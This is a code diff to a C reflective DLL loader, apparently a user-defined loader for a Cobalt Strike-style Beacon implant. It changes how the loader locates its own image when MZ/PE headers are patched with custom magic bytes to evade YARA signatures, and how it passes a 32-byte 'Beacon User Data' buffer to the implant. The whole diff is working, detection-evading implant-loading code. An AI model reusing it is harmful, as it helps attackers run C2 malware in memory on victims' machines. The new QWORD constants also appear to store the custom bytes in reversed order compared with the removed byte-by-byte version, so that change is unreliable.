@@ -320,33 +320,34 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     int k;
     BW_DLLMAIN dllmain;
 
-    /* this function runs FROM the flat copy (the wall is in .text). Scan
-     * backwards page-by-page for the MZ/PE that owns us - that is the
-     * container's decode buffer, NOT the host EXE (the EXE sits at a
+    /* this function runs FROM the wall (.text). Locate the image that owns
+     * us: scan backwards page-by-page for the MZ/PE that owns us - that is
+     * the container's decode buffer, NOT the host EXE (the EXE sits at a
      * lower address and would only match if we walked past the flat copy).
      *
-     * magic_mz_x64 / magic_pe support (YARA tradecraft): the generator may
-     * patch the image's MZ/PE signatures with custom magic bytes. The
-     * loader stub still starts with the ORIGINAL "MZ  " pattern (the
-     * patchDOSHeaderX64 stub opens with 4D 5A 00 00), so the scan keys on
-     * that stub signature first and validates the candidate by a sane
-     * e_lfanew + a PE header OR a second stub marker at e_lfanew (a
-     * patched image no longer carries IMAGE_NT_SIGNATURE). */
+     * magic_mz_x64/magic_pe support: the generator may replace the image's
+     * MZ/PE signatures with custom magic, so the header scan can miss. When
+     * it does, fall back to VirtualQuery on our own code pointer - the
+     * AllocationBase of the wall's region IS the image base regardless of
+     * what the header bytes say (fully magic-agnostic). */
     {
         QWORD pc = (QWORD)(DWORD_PTR)&ReflectiveLoader;
         flat = NULL;
         for (j = 0; j < 4096; j++) {
             unsigned char * page = (unsigned char *)(pc & ~0xFFFULL) - (unsigned long long)j * 0x1000;
-            DWORD lf = *(DWORD *)(page + 0x3C);
-            if (*(DWORD *)page == 0x00005A4DUL            /* MZ   stub signature */
-                && lf >= 0x40 && lf < 0x1000) {
-                DWORD sig = *(DWORD *)(page + lf);
-                if (sig == IMAGE_NT_SIGNATURE              /* unpatched image */
-                    || sig == 0x00005045UL) {              /* "PE  "-stubbed too */
+            if (*(WORD *)page == IMAGE_DOS_SIGNATURE) {
+                DWORD lf = *(DWORD *)(page + 0x3C);
+                if (lf < 0x1000 && *(DWORD *)(page + lf) == IMAGE_NT_SIGNATURE) {
                     flat = page;
                     break;
                 }
             }
+        }
+        if (flat == NULL) {
+            MEMORY_BASIC_INFORMATION mbi;
+            if (pVQ != NULL && pVQ((LPCVOID)(pc & ~0xFFFULL), &mbi, sizeof(mbi)) != 0
+                && mbi.AllocationBase != NULL)
+                flat = (unsigned char *)mbi.AllocationBase;
         }
         if (flat == NULL)
             return 0;
@@ -547,56 +548,25 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
      * carries the ALLOCATION base, not `flat` itself - VirtualFree with
      * MEM_RELEASE needs the base or it silently fails. */
     dllmain = (BW_DLLMAIN)(sc_base + opt->AddressOfEntryPoint);
-#if !defined(BW_UDRL_USER_DATA_DISABLE)
-#define BW_UDRL_USER_DATA "P3UD0123456789ABCDEFGHIJKLMNOP"
-#endif
 #if defined(BW_UDRL_USER_DATA_DELIVER)
     /* 4.9 Beacon User Data: deliver a 32-byte custom buffer with reason
      * 0x0d BEFORE the standard PROCESS_ATTACH - the official contract.
-     * Stores go through a VOLATILE pointer: the harness loader bake
-     * carries only the .text section, so the compiler must keep every
-     * byte as an immediate store - left free it vectorizes into XMM
-     * constants in .rdata (observed: __xmm@... unknown symbols, 0-byte
-     * extraction). Build with /DBW_UDRL_USER_DATA_DELIVER=1. */
+     * Four volatile QWORD stores: volatile defeats the compiler's XMM
+     * vectorization (free byte-stores became __xmm@ .rdata constants -
+     * unknown-symbol extraction failures, observed live) and the harness
+     * bake carries only the .text section. Build with
+     * /DBW_UDRL_USER_DATA_DELIVER=1 to enable. */
     {
         struct { unsigned int length; unsigned int version; void *syscalls; char custom[32]; } ud;
-        volatile char * dst;
+        volatile unsigned long long * dst;
         ud.length = (unsigned int)sizeof(ud);
         ud.version = 1;
         ud.syscalls = NULL;
-        dst = ud.custom;
-        *dst++ = 'P';
-        *dst++ = '3';
-        *dst++ = 'U';
-        *dst++ = 'D';
-        *dst++ = '0';
-        *dst++ = '1';
-        *dst++ = '2';
-        *dst++ = '3';
-        *dst++ = '4';
-        *dst++ = '5';
-        *dst++ = '6';
-        *dst++ = '7';
-        *dst++ = '8';
-        *dst++ = '9';
-        *dst++ = 'A';
-        *dst++ = 'B';
-        *dst++ = 'C';
-        *dst++ = 'D';
-        *dst++ = 'E';
-        *dst++ = 'F';
-        *dst++ = 'G';
-        *dst++ = 'H';
-        *dst++ = 'I';
-        *dst++ = 'J';
-        *dst++ = 'K';
-        *dst++ = 'L';
-        *dst++ = 'M';
-        *dst++ = 'N';
-        *dst++ = 'O';
-        *dst++ = 'P';
-        *dst++ = 'X';
-        *dst++ = 'Y';
+        dst = (volatile unsigned long long *)ud.custom;
+        *dst++ = 0x5033554430313233ULL;
+        *dst++ = 0x3435363738394142ULL;
+        *dst++ = 0x434445464748494AULL;
+        *dst++ = 0x4B4C4D4E4F505859ULL;
         dllmain((void *)sc_base, 0x0d, &ud);
     }
 #endif
